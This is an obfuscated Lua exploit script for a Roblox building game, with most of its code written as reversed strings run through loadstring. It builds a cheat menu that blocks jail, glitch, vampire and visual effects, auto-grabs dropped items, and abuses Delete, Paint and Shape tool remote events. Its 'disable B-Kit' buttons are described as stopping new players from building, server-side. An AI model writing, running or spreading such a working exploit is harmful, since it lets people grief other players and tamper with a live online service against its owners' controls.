)(tcennocsiD:pooLliaJitnA.G_				
neht pooLliaJitnA.G_ fi			
			
esle		
)dne			
dne				
dne					
1 = ycnerapsnarT.trap						
eslaf = edilloCnaC.trap						
neht "traP" == emaN.trap dna )"traPesaB"(AsI:trap fi					
od ))(nerdlihCteG:liaj(sriap ni trap ,_ rof				

dne				
eurt = deifitoNsah					
)2 ,"!dnammoc liaj dekcolB"(yfitoN.G_					
neht deifitoNsah ton fi				
				

dne				
 nruter					
eslaf = deifitoNsah					
 neht liaj ton fi				
)"liaJ"(dlihCtsriFdniF:rahc = liaj lacol				

dne nruter neht rahc ton fi				
)emaN.reyalPlacoL(dlihCtsriFdniF:ecapskrow = rahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLliaJitnA.G_			

eslaf = deifitoNsah lacol			
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".llec liaj ruoy sevomer yllausiV" = pitloot	
,tpircs = xobpuorg	
,"liaj" = emarf	
{(elggoTetaerC.G_




)}
dne	
dne		
dne			
lin = pooLhctilGitnA.G_				
)(tcennocsiD:pooLhctilGitnA.G_				
neht pooLhctilGitnA.G_ fi			
			
esle		
)dne			
dne				
noitisoP.toor - emarFC.toor = noitatneirOtsal					
soPtnerruc = noitisoPtsal					
eslaf = kcaBdetropeleTsah					
					
neht 5 => )7654321 - X.soPtnerruc(sba.htam fiesle				
)2 ,"!dnammoc hctilg dekcolB"(yfitoN.G_					
eurt = kcaBdetropeleTsah					
noitatneirOtsal * )noitisoPtsal(wen.emarFC = emarFC.toor					
					
neht kcaBdetropeleTsah ton dna 5 < )7654321 - X.soPtnerruc(sba.htam fi				
				

noitisoP.toor = soPtnerruc lacol				

dne				
nruter					
eslaf = kcaBdetropeleTsah					
noitisoP.toor - emarFC.toor = noitatneirOtsal					
noitisoP.toor = noitisoPtsal					
neht noitisoPtsal ton fi				

dne nruter neht toor ton fi				
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = toor lacol				
dne nruter neht retcarahc ton fi				
retcarahC.reyalPlacoL = retcarahc lacol				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLhctilGitnA.G_			

eslaf = kcaBdetropeleTsah lacol			
lin = noitatneirOtsal lacol			
lin = noitisoPtsal lacol			
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".uoy gnihctilg morf dnammoc hctilg eht stneverP" = pitloot	
,tpircs = xobpuorg	
,"hctilg" = emarf	
{(elggoTetaerC.G_









)}
dne	
dne		
dne			
}{ = spooLpmaVitnA.G_				
dne				
)dne					
dne						
)(tcennocsiD:pool							
neht pool fi						
)(noitcnuf(llacp					
od )spooLpmaVitnA.G_(sriap ni pool ,_ rof				
neht spooLpmaVitnA.G_ fi			
			

dne			
lin = noitcennoCpmaVitnA.G_				
)(tcennocsiD:noitcennoCpmaVitnA.G_				
neht noitcennoCpmaVitnA.G_ fi			
			
esle		
dne			
)retcarahC.reyalPlacoL(deddAretcarahCno				
neht retcarahC.reyalPlacoL fi			
			

)deddAretcarahCno(tcennoC:deddAretcarahC.reyalPlacoL = noitcennoCpmaVitnA.G_			
			

dne			
)pooLpmet ,spooLpmaVitnA.G_(tresni.elbat				
				

)dne				
dne					
dionamuh = tcejbuSaremaC.aremaCtnerruC.ecapskrow						
motsuC.epyTaremaC.munE = epyTaremaC.aremaCtnerruC.ecapskrow						
)dne						
)eurt ,kcapkcaB.epyTiuGeroC.munE(delbanEiuGeroCteS:iuGretratS							
)(noitcnuf(llacp						
neht 0 > htlaeH.dionamuh dna dionamuh fi					

dne					
nruter						
dne						
dne							
kaerb								
)i ,spooLpmaVitnA.G_(evomer.elbat								
neht pooLpmet == pool fi							
od )spooLpmaVitnA.G_(sriap ni pool ,i rof						
dne						
lin = pooLpmet							
)(tcennocsiD:pooLpmet							
neht pooLpmet fi						
						
neht 5 => emiTtrats - )(kcit fi					
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = pooLpmet				
pooLpmet lacol				
)(kcit = emiTtrats lacol				
				

)"dionamuH"(dlihCroFtiaW:retcarahc = dionamuh lacol				
)retcarahc(deddAretcarahCno noitcnuf lacol			
			

}{ ro spooLpmaVitnA.G_ = spooLpmaVitnA.G_			
			

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol			
)"iuGretratS"(ecivreSteG:emag = iuGretratS lacol			
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".yrotnevni dna aremac ruoy gnikaerb morf raeg rehsiuqnaV eripmaV eht tuo skcolB" = pitloot	
,tpircs = xobpuorg	
,"eripmav" = emarf	
{(elggoTetaerC.G_







)}
dne	
dne		
dne			
lin = pooLlausiVitnA.G_				
)(tcennocsiD:pooLlausiVitnA.G_				
neht pooLlausiVitnA.G_ fi			
			
esle		
)dne			
dne eslaf = delbanE.bgr neht bgr fi				
)"BGR"(dlihCtsriFdniF:gnithgiL = bgr lacol				
				

dne 0 = ytisneD.gof neht gof fi				
)"goF"(dlihCtsriFdniF:gnithgiL = gof lacol				
				

dne				
dne					
dne						
1 = ycnerapsnarTdnuorgkcaB.emarf							
neht emarf fi						
)"emarF"(ssalCfOdlihCtsriFdniF:dnilb = emarf lacol						
neht dnilb fi					
)"dnilB"(dlihCtsriFdniF:iuGreyalp = dnilb lacol					
neht iuGreyalp fi				
)"iuGreyalP"(dlihCtsriFdniF:reyalPlacoL = iuGreyalp lacol				
				

dne eslaf = delbanE.rulb neht rulb fi				
)"rulB"(dlihCtsriFdniF:gnithgiL = rulb lacol				
				

reyalPlacoL.)"sreyalP"(ecivreSteG:emag = reyalPlacoL lacol				
)"gnithgiL"(ecivreSteG:emag = gnithgiL lacol				
)(noitcnuf(tcennoC:taebtraeH.)"ecivreSnuR"(ecivreSteG:emag = pooLlausiVitnA.G_			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".cipoym dna ,gof ,sselroloc ,dnilb :sedulcni hcihw stceffe lausiv niam lla sediH" = pitloot	
,tpircs = xobpuorg	
,"lausiv" = emarf	
{(elggoTetaerC.G_





dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol
nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_2bf);
local function C_352()
local script = _llza[_sc(51,53,50)];
loadstring(([[)}
,dne	
dne		
eslaf nruter			
)3 ,"!tiK-B elbasid ot deliaF"(yfitoN.G_			
)1 ,"!deliaF" ro rre ,"gotikbelbasid"(txeTnottuBteS.G_			
esle		
eurt nruter			
)3 ,"!yllufsseccus delbasid tiK-B"(yfitoN.G_			
)1 ,"!tiK-B delbasiD" ,"gotikbelbasid"(txeTnottuBteS.G_			
neht sseccus fi		
)dne		
)"deteled ton ebuC - tuoemiT"(rorre			
dne			
)10.0(tiaw.ksat				
)"htoomS" ,)(wen.3roloC ,ebuc ,poT.dIlamroN.munE ,noitisoP.prh(revreSeriF:stneve				
dne				
eurt nruter					
neht )"ebuC"(dlihCtsriFdniF:sr ton fi				
od dellecnac.nekot ton dna emiTxam < emiTtrats - )(kcit elihw			
5 = emiTxam lacol			
)(kcit = emiTtrats lacol			
dne )"kcapkcaB ni stnevE oN"(rorre neht stneve ton fi			
)"stnevE"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = stneve lacol			
dne )"egarotSdetacilpeR ni ebuC oN"(rorre neht ebuc ton fi			
)"ebuC"(dlihCtsriFdniF:sr = ebuc lacol			
dne )"traPtooRdionamuH oN"(rorre neht prh ton fi			
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol			

dne )"!dedeen loot eteleD"(rorre neht looTeteled ton fi			
)"eteleD"(dlihCtsriFdniF:retcarahc ro )"eteleD"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = looTeteled lacol			

dne			
)1.0(tiaw.ksat				
)"eteleD"(looThserfeR.derahs				
neht looThserfeR.derahs fi			
			

dne )"retcarahc oN"(rorre neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			
)"egarotSdetacilpeR"(ecivreSteG:emag = sr lacol			
reyalPlacoL.sreyalP = reyalPlacoL lacol			
)"sreyalP"(ecivreSteG:emag = sreyalP lacol			
)(noitcnuf(llacp = rre ,sseccus lacol		
)999 ,"...gnissecorP" ,"gotikbelbasid"(txeTnottuBteS.G_ = nekot lacol		
)(noitcnuf = kcabllac	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!deliaF" = egasseMrorre	
,"!tiK-B delbasiD" = egasseMretfa	
,1 = tiaWmrifnoc	
,"?erus uoy erA" = egasseMmrifnoc	
,eurt = mrifnoCsdeen	
,".dliub ot elba eb regnol on lliw tiK-B steg ohw sreyalp weN .loot eteled gnisu srevres GO ni dedisrevres tiK-B selbasiD" = pitloot	
,tpircs = xobpuorg	
,"gotikbelbasid" = emarf	
{(nottuBetaerC.G_













)}
,dne	
dne		
eslaf nruter			
)1 ,"!deliaF" ,"kcirberotser"(txeTnottuBteS.G_			
esle		
eslaf nruter			
)1 ,tluser ,"kcirberotser"(txeTnottuBteS.G_			
neht "gnirts" == )tluser(epyt fiesle		
eurt nruter			
)1 ,"!kcirb derotseR" ,"kcirberotser"(txeTnottuBteS.G_			
neht eurt == tluser dna sseccus fi		

)dne		
eurt nruter			

dne			
dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,kcaB.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od Z.sopkcolb - 3 ,1 = i rof				

dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,tnorF.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od Z.sopkcolb ,1 = i rof				

dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,poT.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od Y.sopkcolb - 3 ,1 = i rof				

dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,mottoB.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od Y.sopkcolb ,1 = i rof				

dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,thgiR.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od X.sopkcolb - 3 ,1 = i rof				

dne				
)51.0(tiaw.ksat					
)"esaercni" ,noitisoP.kcolb ,tfeL.dIlamroN.munE ,kcolb(revreSeriF:tnevE.tpircS.lootepahs					
od X.sopkcolb ,1 = i rof				

)5.0 ,5.0 ,5.0(wen.3rotceV - sopkcolb = sopkcolb				
)4 % Z.sopkcolb ,4 % Y.sopkcolb ,4 % X.sopkcolb(wen.3rotceV = sopkcolb				
noitisoP.kcolb = sopkcolb lacol				
neht lootepahs fi			

dne			
dne				
)(wen.emarFC == noitisoP.kcolb - emarFC.kcolb dna derohcnA.kcolb litnu					
)(tiaw.ksat						
dne						
)							
""								
,"rohcna"								
,)291 ,291 ,291(BGRmorf.3roloC								
,"���� htob"								
,)(soprlpteg								
,poT.dIlamroN.munE								
,kcolb								
(revreSeriF:tnevE.tpircS.loottniap							
)2 * sw( + )(kcit = l							
neht l > )(kcit fi						
taeper					
)(kcit = l lacol					
neht )(wen.emarFC =~ noitisoP.kcolb - emarFC.kcolb ro derohcnA.kcolb ton fi				

dne				
)2 * sw(tiaw.ksat					
)					
""						
,"citsalp"						
,)291 ,291 ,291(BGRmorf.3roloC						
,"lairetam"						
,)(soprlpteg						
,poT.dIlamroN.munE						
,kcolb						
(revreSeriF:tnevE.tpircS.loottniap					
neht citsalP.lairetaM.munE =~ lairetaM.kcolb fi				
neht loottniap fi			

])(nerdlihCteG:redlofreyalp#[)(nerdlihCteG:redlofreyalp = kcolb			

dne			
"!detaerc kcolb oN" nruter				
neht kcolb ton fi			

)"traPesaB"(AsIhcihWdlihCtsriFdniF:redlofreyalp = kcolb			
)1(tiaw.ksat			

dne			
dne				
dne					
kaerb						
neht )(nerdlihCteG:redlofreyalp# < tmaerofeb fi					
)sw(tiaw.ksat					

dne					
)						
"deliated"							
,)(soprlpteg							
,poT.dIlamroN.munE							
,kcolb							
(revreSeriF:tnevE.tpircS.lootdliub						
neht )"tnevE"(dlihCtsriFdniF:tpircS.lootdliub dna )"tpircS"(dlihCtsriFdniF:lootdliub fi					
v = kcolb					
neht "ecnatsnI" == )v(foepyt dna lin =~ v fi				
od )cbrruc(sriap ni v ,_ rof			

)(nerdlihCteG:redlofreyalp# = tmaerofeb lacol			
lin = kcolb lacol			

dne			
"!dnuof ton redlof reyalP" nruter				
neht redlofreyalp ton fi			
)emaN.reyalPlacoL(dlihCtsriFdniF:redlofc = redlofreyalp lacol			

dne			
"!dnuof skcolb oN" nruter				
neht 0 == cbrruc# fi			

dne			
dne				
dne					
)v ,cbrruc(tresni.elbat						
esle					
)v ,1 ,cbrruc(tresni.elbat						
neht "sirbeD" =~ emaN.v dna emankcirb =~ )(emaNlluFteG:v fi					
neht "ecnatsnI" == )v(foepyt dna lin =~ v fi				
od )noitcellockcirb.)(vnegteg(sriap ni v ,_ rof			
}{ = cbrruc lacol			

)sw(tiaw.ksat			

dne			
retcarahc = tneraP.lootepahs				
neht kcapkcaB.reyalPlacoL == tneraP.lootepahs dna lootepahs fi			
dne			
retcarahc = tneraP.loottniap				
neht kcapkcaB.reyalPlacoL == tneraP.loottniap dna loottniap fi			
dne			
retcarahc = tneraP.lootdliub				
neht kcapkcaB.reyalPlacoL == tneraP.lootdliub fi			

dne			
"!dedeen loot dliuB" nruter				
neht lootdliub ton fi			

)"epahS"(lootdnif = lootepahs lacol			
)"tniaP"(lootdnif = loottniap lacol			
)"dliuB"(lootdnif = lootdliub lacol			

dne			
dne				
eurt = delbanE.tpircS.v					
eslaf = delbanE.tpircS.v					
neht )"veDzamoT yb enO nesohC ehT"(gaTsaH:v fi				
od ))(nerdlihCteG:kcapkcaB.reyalPlacoL(sriap ni v ,_ rof			

dne			
dne				
eurt = delbanE.tpircS.v					
eslaf = delbanE.tpircS.v					
neht )"veDzamoT yb enO nesohC ehT"(gaTsaH:v fi				
od ))(nerdlihCteG:retcarahc(sriap ni v ,_ rof			

dne			
sr = tneraP.kcirb				
emankcirb = emaN.kcirb				
)"traP"(wen.ecnatsnI = kcirb lacol				
neht )emankcirb(dlihCtsriFdniF:sr ton fi			

dne			
lin nruter				
dne				
dne					
v nruter						
neht )emanloot(dnif:emaN.v dna )"looT"(AsI:v fi					
od ))(nerdlihCteG:kcapkcaB.reyalPlacoL(sriap ni v ,_ rof				
dne				
dne					
v nruter						
neht )emanloot(dnif:emaN.v dna )"looT"(AsI:v fi					
od ))(nerdlihCteG:retcarahc(sriap ni v ,_ rof				
)emanloot(lootdnif noitcnuf lacol			

dne			
noitisoP.prh nruter				
)(soprlpteg noitcnuf lacol			

dne "!traPtooRdionamuH oN" nruter neht prh ton fi			
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol			

dne "!retcarahc oN" nruter neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			

dne			
"!redlof skcolb oN" nruter				
neht redlofc ton fi			

)"skcolB"(dlihCtsriFdniF:ecapskrow ro )"skcirB"(dlihCtsriFdniF:ecapskrow = redlofc lacol			
532.0 = sw lacol			
"kcirB" = emankcirb lacol			

)"ecapskroW"(ecivreSteG:emag = ecapskrow lacol			
)"egarotSdetacilpeR"(ecivreSteG:emag = sr lacol			
reyalPlacoL.sreyalP = reyalPlacoL lacol			
)"sreyalP"(ecivreSteG:emag = sreyalP lacol			
)(noitcnuf(llacp = tluser ,sseccus lacol		

dne		
}{ = noitcellockcirb.)(vnegteg			
neht lin == noitcellockcirb.)(vnegteg fi		

)999 ,"...gnissecorP" ,"kcirberotser"(txeTnottuBteS.G_ = nekot lacol		
)(noitcnuf = kcabllac	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!deliaF" = egasseMrorre	
,"!kcirb derotseR" = egasseMretfa	
,".delbasid steg tiK-B erofeb revres eht ni eb tsum uoY .no ecalp ot skcolb erom on sereht dna ,nekorb si tiK-B nehw osrot ruoy ta kcolb a secalp semitemos dna kcirb serotseR" = pitloot	
,tpircs = xobpuorg	
,"kcirberotser" = emarf	
{(nottuBetaerC.G_

dne
dne	
dne		
)v(cbd			
od ))(stnadnecseDteG:redlofc(sriap ni v ,_ rof		
)cbd(tcennoC:deddAtnadnecseD.redlofc		
neht redlofc fi	

dne	
dne		
)b ,1 ,noitcellockcirb.)(vnegteg(tresni.elbat			
neht )b ,noitcellockcirb.)(vnegteg(dnif.elbat ton fi		
dne nruter neht emankcirb =~ emaN.b fi		
)b(cbd noitcnuf lacol	

)"skcolB"(dlihCtsriFdniF:ecapskrow ro )"skcirB"(dlihCtsriFdniF:ecapskrow = redlofc lacol	
"kcirB" = emankcirb lacol	

}{ = noitcellockcirb.)(vnegteg	
neht lin == noitcellockcirb.)(vnegteg fi




)}
,dne	
dne		
eslaf nruter			
)3 ,"!kcirb xif ot deliaF"(yfitoN.G_			
)1 ,"!deliaF" ro rre ,"kcirbxif"(txeTnottuBteS.G_			
esle		
eurt nruter			
)3 ,"!yllufsseccus dexif kcirB"(yfitoN.G_			
)1 ,"!kcirb dexiF" ,"kcirbxif"(txeTnottuBteS.G_			
neht sseccus fi		
)dne		
dne			
)"" ,"edilloc" ,)571 ,271 ,371(BGRmorf.3roloC ,"lairetam" ,sop ,poT.dIlamroN.munE ,kcirb(revreSeriF:tneve				
)1.0(tiaw.ksat				
neht edilloCnaC.kcirb ton fi			
dne			
)"" ,"rohcna" ,)571 ,271 ,371(BGRmorf.3roloC ,"lairetam" ,sop ,poT.dIlamroN.munE ,kcirb(revreSeriF:tneve				
)1.0(tiaw.ksat				
neht derohcnA.kcirb ton fi			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,poT.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,tnorF.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,kcaB.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,thgiR.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,tfeL.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"yarps" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,mottoB.dIlamroN.munE ,kcirb(revreSeriF:tneve			
)1.0(tiaw.ksat			
)"" ,"citsalp" ,)291 ,291 ,291(BGRmorf.3roloC ,"���� htob" ,sop ,poT.dIlamroN.munE ,kcirb(revreSeriF:tneve			
noitisoP.prh = sop lacol			
dne )"traPtooRdionamuH oN"(rorre neht prh ton fi			
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol			
)"tnevE"(dlihCroFtiaW:)"tpircS"(dlihCroFtiaW:looTtniap = tneve lacol			
dne )"dnuof ton loot tniaP"(rorre neht looTtniap ton fi			
)"tniaP"(dlihCtsriFdniF:retcarahc ro )"tniaP"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = looTtniap			
dne			
)1.0(tiaw.ksat				
)"tniaP"(looThserfeR.derahs				
neht looThserfeR.derahs fi			
dne )"!dedeen loot tniaP"(rorre neht looTtniap ton fi			
)"tniaP"(dlihCtsriFdniF:retcarahc ro )"tniaP"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = looTtniap lacol			
dne )"retcarahc oN"(rorre neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			
dne			
)"!dnuof ton kcirB"(rorre				
neht )"EKAF"(gaTsaH:kcirb ro kcirb ton fi			
)"kcirB"(dlihCtsriFdniF:sr = kcirb lacol			
)"egarotSdetacilpeR"(ecivreSteG:emag = sr lacol			
reyalPlacoL.sreyalP = reyalPlacoL lacol			
)"sreyalP"(ecivreSteG:emag = sreyalP lacol			
)(noitcnuf(llacp = rre ,sseccus lacol		
)999 ,"...gnissecorP" ,"kcirbxif"(txeTnottuBteS.G_ = nekot lacol		
)(noitcnuf = kcabllac	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!deliaF" = egasseMrorre	
,"!kcirb dexiF" = egasseMretfa	
,".tiK-B nekorb xif ton seod sihT .loot tniap gnisu lamron ot ,ti detniap enoemos fi ,kcirb eht serotser/sexiF" = pitloot	
,tpircs = xobpuorg	
,"kcirbxif" = emarf	
{(nottuBetaerC.G_




)}
,dne	
dne		
eslaf nruter			
)3 ,"!tiK-B elbasid ot deliaF"(yfitoN.G_			
)1 ,"!deliaF" ro rre ,"tikbelbasid"(txeTnottuBteS.G_			
esle		
eurt nruter			
)3 ,"!yllufsseccus delbasid tiK-B"(yfitoN.G_			
)1 ,"!tiK-B delbasiD" ,"tikbelbasid"(txeTnottuBteS.G_			
neht sseccus fi		
)dne		
)"deteled ton kcirB - tuoemiT"(rorre			
dne			
)10.0(tiaw.ksat				
)noitisoP.traPtooRdionamuH.retcarahc ,kcirb(revreSeriF:tneve				
dne				
eurt nruter					
neht )"kcirB"(dlihCtsriFdniF:sr ton fi				
od dellecnac.nekot ton dna emiTxam < emiTtrats - )(kcit elihw			
5 = emiTxam lacol			
)(kcit = emiTtrats lacol			
dne )"egarotSdetacilpeR ni kcirB oN"(rorre neht kcirb ton fi			
)"kcirB"(dlihCtsriFdniF:sr = kcirb lacol			
)"tnevE"(dlihCroFtiaW:)"tpircS"(dlihCroFtiaW:looTeteled = tneve lacol			

dne )"!dedeen loot eteleD"(rorre neht looTeteled ton fi			
)"eteleD"(dlihCtsriFdniF:retcarahc ro )"eteleD"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = looTeteled lacol			

dne			
)1.0(tiaw.ksat				
)"eteleD"(looThserfeR.derahs				
neht looThserfeR.derahs fi			
			

dne )"retcarahc oN"(rorre neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			
)"egarotSdetacilpeR"(ecivreSteG:emag = sr lacol			
reyalPlacoL.sreyalP = reyalPlacoL lacol			
)"sreyalP"(ecivreSteG:emag = sreyalP lacol			
)(noitcnuf(llacp = rre ,sseccus lacol		
)999 ,"...gnissecorP" ,"tikbelbasid"(txeTnottuBteS.G_ = nekot lacol		
)(noitcnuf = kcabllac	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!deliaF" = egasseMrorre	
,"!tiK-B delbasiD" = egasseMretfa	
,1 = tiaWmrifnoc	
,"?erus uoy erA" = egasseMmrifnoc	
,eurt = mrifnoCsdeen	
,".dliub ot elba eb regnol on lliw tiK-B steg ohw sreyalp weN .loot eteled gnisu dedisrevres tiK-B selbasiD" = pitloot	
,tpircs = xobpuorg	
,"tikbelbasid" = emarf	
{(nottuBetaerC.G_



)}
,dne	
dne		
eslaf nruter			
)3 ,"!sdnuos elbasid ot deliaF"(yfitoN.G_			
)1 ,"!deliaF" ro rre ,"dnuoseteledelbasid"(txeTnottuBteS.G_			
esle		
eurt nruter			
)3 ,"!delbasid sdnuos gnidliuB"(yfitoN.G_			
)1 ,"!sdnuos delbasiD" ,"dnuoseteledelbasid"(txeTnottuBteS.G_			
neht sseccus fi		
)dne		
dne			
)10.0(tiaw.ksat				
)noitisoP.prh ,kcirb(revreSeriF:tneve				
od 2 ,1 = i rof			
dne )"traPtooRdionamuH ni dnuof ton kcirB"(rorre neht kcirb ton fi			
)"kcirB"(dlihCtsriFdniF:prh = kcirb lacol			
dne )"traPtooRdionamuH oN"(rorre neht prh ton fi			
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol			
)"tnevE"(dlihCroFtiaW:)"tpircS"(dlihCroFtiaW:looTeteled = tneve lacol			

dne )"!dedeen loot eteleD"(rorre neht looTeteled ton fi			
)"eteleD"(dlihCtsriFdniF:retcarahc ro )"eteleD"(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = looTeteled lacol			

dne			
)1.0(tiaw.ksat				
)"eteleD"(looThserfeR.derahs				
neht looThserfeR.derahs fi			
			

dne )"retcarahc oN"(rorre neht retcarahc ton fi			
retcarahC.reyalPlacoL = retcarahc lacol			
dne			
)"!detroppus ton GO"(rorre				
neht gosi fi			
lin =~ )"sebuC"(dlihCtsriFdniF:ecapskrow = gosi lacol			
)"ecapskroW"(ecivreSteG:emag = ecapskrow lacol			
reyalPlacoL.sreyalP = reyalPlacoL lacol			
)"sreyalP"(ecivreSteG:emag = sreyalP lacol			
)(noitcnuf(llacp = rre ,sseccus lacol		
)999 ,"...gnissecorP" ,"dnuoseteledelbasid"(txeTnottuBteS.G_ = nekot lacol		
)(noitcnuf = kcabllac	
,eurt = retfAgniruDkcilCnac	
,1 = tiaWegasseMretfa	
,"!deliaF" = egasseMrorre	
,"!sdnuos delbasiD" = egasseMretfa	
,".sdnuos eht erotser lliw gninwapser ,loot eteled gnisu sdnuos gnidliub selbasid yliraropmeT" = pitloot	
,tpircs = xobpuorg	
,"dnuoseteledelbasid" = emarf	
{(nottuBetaerC.G_





)}
dne	
dne		
}{ = slooTdekciPotua			
dne			
lin = pooLpiuqenu				
)pooLpiuqenu(lecnac.ksat				
neht pooLpiuqenu fi			
dne			
lin = pooLpukcip				
)pooLpukcip(lecnac.ksat				
neht pooLpukcip fi			
			
esle		
)dne			
dne				
)(tiaw.ksat					
dne					
dne						
dne							
kcapkcaB.reyalPlacoL = tneraP.loot								
neht ]loot[slooTdekciPotua < emiTtnerruc dna ]loot[slooTdekciPotua dna )"looT"(AsI:loot fi							
od ))(nerdlihCteG:rahc(sriap ni loot ,_ rof						
dne						
dne							
lin = ]loot[slooTdekciPotua								
neht yripxe > emiTtnerruc fi							
od )slooTdekciPotua(sriap ni yripxe ,loot rof						
)(kcit = emiTtnerruc lacol						
neht rahc fi					
retcarahC.reyalPlacoL = rahc lacol					
od eurt elihw				
)(noitcnuf(nwaps.ksat = pooLpiuqenu			
			
)dne			
dne				
)(tiaw.ksat					
dne					
dne						
)looTtnerruc(looTpiuqE:muh							
)50.0(tiaw.ksat							
neht ]looTtnerruc[slooTdekciPotua ton dna kcapkcaB.reyalPlacoL == tneraP.looTtnerruc dna looTtnerruc fi						
dne						
dne							
)2 ,emaNloot .. " :loot debbarg otuA"(yfitoN.G_								
								

)dne								
)jbo(looTpiuqE:muh									
)(noitcnuf(llacp								
emaN.jbo = emaNloot lacol								
5.0 + )(kcit = ]jbo[slooTdekciPotua								
neht ]jbo[slooTdekciPotua ton dna )GAT_HTAED(gaTsaH:jbo ton dna )"eldnaH"(dlihCtsriFdniF:jbo dna )"looT"(AsI:jbo fi							
od ))(nerdlihCteG:ecapskrow(sriapi ni jbo ,_ rof						
)"looT"(ssalCfOdlihCtsriFdniF:rahc = looTtnerruc lacol						
neht 0 > htlaeH.muh dna muh fi					
)"dionamuH"(AsIhcihWdlihCtsriFdniF:rahc dna rahc = muh lacol					
retcarahC.reyalPlacoL = rahc lacol					
od eurt elihw				
)(noitcnuf(nwaps.ksat = pooLpukcip			
			
}{ = slooTdekciPotua			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".smeti demrasid/deppord lla sbarg yllacitamotuA" = pitloot	
,tpircs = xobpuorg	
,"bargotua" = emarf	
{(elggoTetaerC.G_
"metIhtaeD" = GAT_HTAED lacol
}{ = slooTdekciPotua lacol
lin = pooLpiuqenu lacol
lin = pooLpukcip lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
